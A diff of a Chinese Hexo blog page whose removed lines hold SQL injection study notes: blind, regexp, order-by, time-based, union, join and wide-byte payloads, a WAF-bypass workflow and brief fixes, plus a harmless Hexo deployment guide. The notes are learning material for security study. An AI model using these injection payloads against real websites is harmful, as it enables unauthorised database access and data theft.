-<p>查询列的个数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;  and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)&gt;2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>在夹逼出列名</p>
-<p><img src="1554040934363.png" alt="1554040934363"></p>
-<p><img src="1554041228074.png" alt="1554041228074"></p>
-<h2 id="正则匹配的盲注-regexp注入"><a href="#正则匹配的盲注-regexp注入" class="headerlink" title="正则匹配的盲注  **regexp注入  **"></a><strong>正则匹配的盲注</strong>  **regexp注入  **</h2><p><img src="1554047306509.png" alt="1554047306509"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select (select password from users where id = 1)regexp&#x27;^e10&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>regexp这个关键字还可以代替where条件里的=号</p>
-<p><img src="1554047568041.png" alt="1554047568041"></p>
-<h2 id="使用场景过滤了-、in、like"><a href="#使用场景过滤了-、in、like" class="headerlink" title="使用场景过滤了=、in、like"></a>使用场景过滤了=、in、like</h2><p>这里的^如果也被过滤了的话，可以使用$来从后往前进行匹配</p>
-<p><img src="1554047808019.png" alt="1554047808019"></p>
-<h2 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h2><h3 id="1、基本注入payload"><a href="#1、基本注入payload" class="headerlink" title="1、基本注入payload"></a>1、基本注入payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where user_id = &#x27;1&#x27; union select 1,2,&#x27;a&#x27;,4,5,6,7 order by 3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>首先先看看order by的使用方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by &#x27;number&#x27; (asc/desc)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>即对某一列进行排序，<strong>默认是升序排列</strong>，即后面默认跟上asc，那么上面一句就相当于</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by 3 asc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>我们在注入时经常会使用order by来判断数据库的列数，那我们这里使用他配合union select来进行注入</p>
-<p>2、原理分析</p>
-<p>首先正常的注入是蓝色那部分的字符串，这里我们的目的是要注出test用户的user_pass值<br><img src="t01c82b98f9bd65effc.png" alt="img"><strong>接着我们在语句后面加上order by 3，即对第三列进行升序排列(按照ascii码表)</strong></p>
-<p><img src="t01c161fc6c34cd8fde.png" alt="img">这里的user_pass列中的3是我们union select里面的第三列，这里就把<code>3</code>替换为<code>a</code><br><img src="t0101ef42a1afcf0ae7.png" alt="img">这里可能看不出什么变化，那么把他改成<code>b</code>看看<br><img src="t014e91c51e99d488d7.png" alt="img">看到用户test跑到第一行来了，所以这里经常用来判断有返回差异的注入，且返回只有一列的输出，根据差异来判断我们盲注的值是否正确</p>
-<p>当然这里也可以使用order by desc降序排列来注入，所以这里要根据使用场景来进行选择</p>
-<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.0.21/yanci.php?username=root&#x27; and sleep(5)%23</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>或者</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.0.21/yanci.php?username=root&#x27; and sleep(5) and &#x27;xRsl&#x27;=&#x27;xRsl#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>或者</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.0.21/yanci.php?username=root&#x27; and If(ascii(substr(database(),1,1))=114,1,sleep(5))#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>盲注一般用脚本跑</p>
-<h3 id="联合查询的注入-（字符型和数字型，搜索型注入）"><a href="#联合查询的注入-（字符型和数字型，搜索型注入）" class="headerlink" title="联合查询的注入 （字符型和数字型，搜索型注入）"></a>联合查询的注入 （字符型和数字型，搜索型注入）</h3><p>数字型： SELECT 列 FROM 表 WHERE 数字型列=值</p>
-<p>字符型： SELECT 列 FROM 表 WHERE 字符型列=’值’</p>
-<p>搜索型： SELECT * FROM 表 WHERE where 被搜索的列 like ‘%值%</p>
-<p>字符型常常要考虑到单引号的闭合问题，</p>
-<p>输入1’order by 1#，页面正常，然后输入1’order by 2#，依次增加，直到3时出现错误，说明当前表有两列  ‘union select 1,2#      </p>
-<p>利用内置函数暴出用户名 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,user()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>利用内置函数暴出数据库版本 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,version()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>利用内置函数暴出数据库名称</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,database()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>暴出表名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,table_name from information_schema.tables where table_schema=database()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>暴出字段名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x64617461（必须是表名的十六进制表示）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>暴出字段内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,    字段名 from 表名。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>报出第一个表：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(select table_name from information_schema.tables where table_schema=database() limit 0,1 )    改变0 即可查看其他表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">group_concat(select table_name from information_schema.tables where table_schema=database())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>查询单个表</p>
-<p><img src="1554128693639.png" alt="1554128693639"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">concat(select table_name from information_schema.tables where table_schema=database()) limit 0,1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>报出所有表明</p>
-<p><img src="1554128418032.png" alt="1554128418032"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27;  union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 and &#x27;%&#x27;=&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="搜索型注入-判断"><a href="#搜索型注入-判断" class="headerlink" title="搜索型注入 判断"></a>搜索型注入 判断</h4><p>一般都用 like’%%’进行模糊查询</p>
-<p>​    ‘and 1=1 and ‘%’=’</p>
-<p>%’ and 1=1–’</p>
-<p>%’ and 1=1 and ‘%’=’</p>
-<h2 id="join注入"><a href="#join注入" class="headerlink" title="join注入"></a>join注入</h2><p><strong>payload：</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select * from (select 1) a join (select 2) b %23</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>优势：过滤了逗号的情况下使用</p>
-<p>下面的payload(别的博客处摘抄来的)适用于过滤了逗号和字段名的情况下使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">union all</span><br><span class="line">select * from(</span><br><span class="line">    (select 1)a join(</span><br><span class="line">        select F.[需要查询的字段号] from(</span><br><span class="line">            select * from [需要查询的表有多少个字段就join多少个]</span><br><span class="line">            union</span><br><span class="line">            select * from [需要查询的表] [limit子句]</span><br><span class="line">        )F-- 我们创建的虚拟表没有表名，因此定义一个别名，然后直接[别名].[字段号]查询数据</span><br><span class="line">    )b-- 同上[还差多少字段就再join多少个，以满足字段数相同的原则]</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="带-的注入"><a href="#带-的注入" class="headerlink" title="带!的注入"></a>带<code>!</code>的注入</h2><p><strong>直接看下面的payload，适用于and、or、^被过滤的情况下使用，有时候可能也会使用到，但是具体的原理不是很明白，大家可以自行google</strong><img src="1554130494912.png" alt="1554130494912"></p>
-<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>在GBK编码时，mysql会认为两个字符是一个汉字（在前一个字节的ascii码大于128的情况下）。而经过转义之后的单引号’会变为\’，即%5c%27。构造id=1%df%27%23  (id=1%df’   sql  %23 )</p>
-<p>对于宽字节编码，有一种最好的修补就是：</p>
-<p>（1）使用mysql_set_charset(GBK)指定字符集</p>
-<p>（2）使用mysql_real_escape_string进行转义</p>
-<p>原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面e5和5c拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢？</p>
-<p>就是使用mysql_set_charset进行指定。</p>
-<p>上述的两个条件是“与”运算的关系，少一条都不行。</p>
-<p>测试;</p>
-<p><img src="20180725163629473.png" alt="img"><br>输出：</p>
-<p><img src="2018072516363889.png" alt="img"><br>效果很明显。</p>
-<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h1><p>如果我们这里的limit被过滤了咋办？那就试试下面的几种方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(1) group_concat(使用的最多)</span><br><span class="line">(2) &lt;&gt;筛选(不等于)</span><br><span class="line">(3) not in</span><br><span class="line">(4) DISTINCT</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="总结的注入流程"><a href="#总结的注入流程" class="headerlink" title="总结的注入流程"></a>总结的注入流程</h2><p>1、先找到注入点，id=，username=，判断GET/POST/COOKIE注入</p>
-<p>2、查看显示位，如果只有一个显示位在使用union注入是注意使用limit来限制显示</p>
-<p>3、判断字符型注入还是数字型注入（2-1，’是否正常）</p>
-<p>4、输入不同值查看页面是否有变化，无变化的话可以考虑采用bool时间盲注，若有报错信息优先考虑报错注入（exp，updatexml（优先采用updatexml、extractvalue报错））</p>
-<p>5、先简单测试空格和注释符是否被替换了，id=1 1，id = 1%231（看看能否用/ /、%20、%0a、%09绕过）</p>
-<p>6、进行fuzz，看看那些被waf了</p>
-<p>7、若页面上没有显示waf过滤之类的提示（sql injection detected），就测试是否有被替换为空的字符（如：’ or ‘*’=’、’ or ‘-‘=’ ，如果页面返回正常的话，则说明该字符被替换为空）</p>
-<p>8、简单尝试双写、编码、大小写替换的方法，判断是否可以绕过</p>
-<p>9、确定注入方式（尽量把盲注放最后），union、报错注入、盲注</p>
-<p>10、先在bp中跑一遍看是否有结果</p>
-<p>11、尝试写脚本</p>
-<p>最重要的两步就是注入点并判断出注入类型，找到被过滤的函数和关键字并找到替代的函数和关键字，这就需要我们靠自己的耐心和细心还有经验的积累了</p>
-<p>感谢博主 ：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/160584#h2-11">https://www.anquanke.com/post/id/160584#h2-11</a> </p>
-<h1 id="SQL注入的一些绕过"><a href="#SQL注入的一些绕过" class="headerlink" title="SQL注入的一些绕过"></a>SQL注入的一些绕过</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/04/22/interview/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1570,82 +735,14 @@
 
 <p><img src="1553759353888.png" alt="1553759353888"></p>
 <h6 id="改nmp的源"><a href="#改nmp的源" class="headerlink" title="改nmp的源"></a>改nmp的源</h6><p>然后将 nmp 的原改道 淘宝的源（官方源比较慢，特慢）</p>
-<p><a target="_blank" rel="noopener" href="https://npm.taobao.org/">淘宝 npm 网址</a></p>
-<p>修改</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry http://registry.npm.taobao.org/</span><br></pre></td></tr></table></figure>
-
-<p>还原</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npmjs.org</span><br></pre></td></tr></table></figure>
-
-
-
-<h6 id="安装hexo-cli：进入终端，键入命令"><a href="#安装hexo-cli：进入终端，键入命令" class="headerlink" title="安装hexo-cli：进入终端，键入命令"></a>安装hexo-cli：进入终端，键入命令</h6><p><code>cnpm i hexo-cli -g</code></p>
-<p>其中 ‘cnpm’ 代替 npm，安装速度更快； ‘i’ 表示install， ‘-g’表示全局安装 (注意：如果安装失败，建议在管理者模式下安装)] </p>
-<p>初始化：在本地合适的位置创建一个文件夹用作Blog环境，比如，我这里在D盘根目录下创建了一个myblog文件夹，进入此目录，击鼠标右键打开gitbash终端，键入命令 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
-
-<p>进行初始化，进度可能很慢[蹲个厕所回来大概就OK了]，耐心等待安装即可。出现下图表示安装成功<img src="1553764265772.png" alt="1553764265772"></p>
-<p>完毕后发现空目录多出很多文件，如下图：<img src="1553764357084.png" alt="1553764357084">这里的node_modules是项目依赖，在初始化的时候已经下载下来了，不用再 <code>hexo i</code> 了(有的教程写的hexo i 就是安装依赖的作用)。</p>
-<h6 id="测试本地运行"><a href="#测试本地运行" class="headerlink" title="测试本地运行"></a>测试本地运行</h6><p>上述环境完成后，我们就可以在本地预览blog了。很简单，两行命令。</p>
-<ul>
-<li>键入命令 <code>hexo generate</code> 生成静态文件，可以简写为 <code>hexo g</code></li>
-<li>键入命令 <code>hexo server</code> 在本地运行， 可以简写为 <code>hexo s</code><br> 出现下图则表示成功<br> <img src="1553764374804.png" alt="1553764374804"></li>
-<li>打开浏览器，地址栏键入 <code>http://localhost:4000</code> 即可进行预览，效果如下</li>
-</ul>
-<p><img src="1553761888592.png" alt="1553761888592"></p>
-<h5 id="部署到GitHub"><a href="#部署到GitHub" class="headerlink" title="部署到GitHub"></a>部署到GitHub</h5><h6 id="添加ssh"><a href="#添加ssh" class="headerlink" title="添加ssh"></a>添加ssh</h6><ul>
-<li><p>创建一个 SSH key 。在命令行（即Git Bash）输入以下命令， 回车三下即可：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;邮箱地址&quot;</span><br></pre></td></tr></table></figure></li>
-<li><p>添加到 github。 复制密钥文件内容（路径形如<code>C:\Users\Administrator\.ssh\id_rsa.pub</code>），粘贴到[New SSH Key]<a target="_blank" rel="noopener" href="https://xxxx.github.com/settings/keys%E5%8D%B3%E5%8F%AF%E3%80%82">https://xxxx.github.com/settings/keys即可。</a></p>
-</li>
-<li><p>测试是否添加成功。在命令行（即Git Bash）依次输入以下命令，返回<code>“You’ve successfully authenticated”</code>即成功：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">$ yes</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>在github上创建一个仓库注意此仓库的名称格式是： <code>你的github用户名.github.io</code> (其中用户名不区分大小写) 如下图  一定要如图操作 </p>
-<p><img src="1553761738477.png" alt="1553761738477"></p>
-<h6 id="修改hexo文件配置"><a href="#修改hexo文件配置" class="headerlink" title="修改hexo文件配置"></a>修改hexo文件配置</h6><ol>
-<li><p>要想部署到github，需要对本地myblog文件夹下的 <code>_config.yml</code> 文件进行配置 如图<br><img src="1553764391193.png" alt="1553764391193"></p>
-</li>
-<li><p>用你的编译器打开该文件，拉到最后，找到 <code>deploy</code> 选项，作如下配置:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:RoseSnow/RoseSnow.github.io.git</span><br><span class="line">  baranch: master</span><br></pre></td></tr></table></figure>
-
-<pre><code> `       repo` 填写你刚刚github创建的仓库的地址，点进你的仓库 选择  SSH  地址
-</code></pre>
-</li>
-</ol>
-<p><img src="1553761780454.png" alt="1553761780454"></p>
-<h4 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h4><p>部署之前，需要安装 git部署插件</p>
-<ol>
-<li><p>打开myblog文件夹，调出<code>&#39;gitbash</code>‘终端，键入 </p>
-<p><code>cnpm i hexo-deployer-git -S</code>   安装插件</p>
-</li>
-<li><p>安装完毕后，键入命令 <code>hexo g</code> 生成静态文件</p>
-</li>
-<li><p>键入命令 <code>hexo d</code> <img src="1553762648409.png" alt="1553762648409"></p>
-<p>找到此文件夹在 config  中添加</p>
-<p><img src="1553762591826.png" alt="1553762591826"></p>
-<p><img src="1553762869327.png" alt="1553762869327"></p>
-<p>[user]</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">email =123456789@qq.com  </span><br><span class="line">name = erlee</span><br><span class="line">//你的邮箱和上面的ssh一样 和你的账号的邮箱也要也要</span><br><span class="line">name 就是你的github用户名</span><br></pre></td></tr></table></figure></li>
-<li><p>再次</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>
-
-<p>像这样就行 <img src="1553763149554.png" alt="1553763149554"></p>
-<p>再进入到github，进入io仓库，点击setting 进入设置，往下拉至 GitHub Pages 看到如图( 这是我解析到我的域名了   ) 正常应该是      您的网站发布于sleepywater/sleepywater.github.io</p>
-<p><img src="1553761051965.png" alt="1553761051965"></p>
-</li>
-</ol>
-<p>然后输入 你的GitHub名.github.io   就能访问</p>
-<p>文章发表：<a target="_blank" rel="noopener" href="https://blog.csdn.net/damienzhong/article/details/84335510">https://blog.csdn.net/damienzhong/article/details/84335510</a></p>
-<p>参考 </p>
-<p>美化等一系列优化：</p>
-<ol>
-<li> <a target="_blank" rel="noopener" href="https://www.simon96.online/2018/10/12/hexo-tutorial/">https://www.simon96.online/2018/10/12/hexo-tutorial/</a></li>
-<li><a target="_blank" rel="noopener" href="http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html">http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html</a></li>
-</ol>
-<p>去掉网站末尾的 印记：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4fbc57269f1b">https://www.jianshu.com/p/4fbc57269f1b</a></p>
-<p>加阅读全文 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/78c218f9d1e7">https://www.jianshu.com/p/78c218f9d1e7</a></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/03/28/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1739,11 +836,15 @@
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
+          
         <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
 
 
 
@@ -1808,6 +909,10 @@
 <script src="/js/next-boot.js"></script>
 
 
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/three-waves.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+    <script defer src="/lib/three/canvas_sphere.min.js"></script>
 
 
   
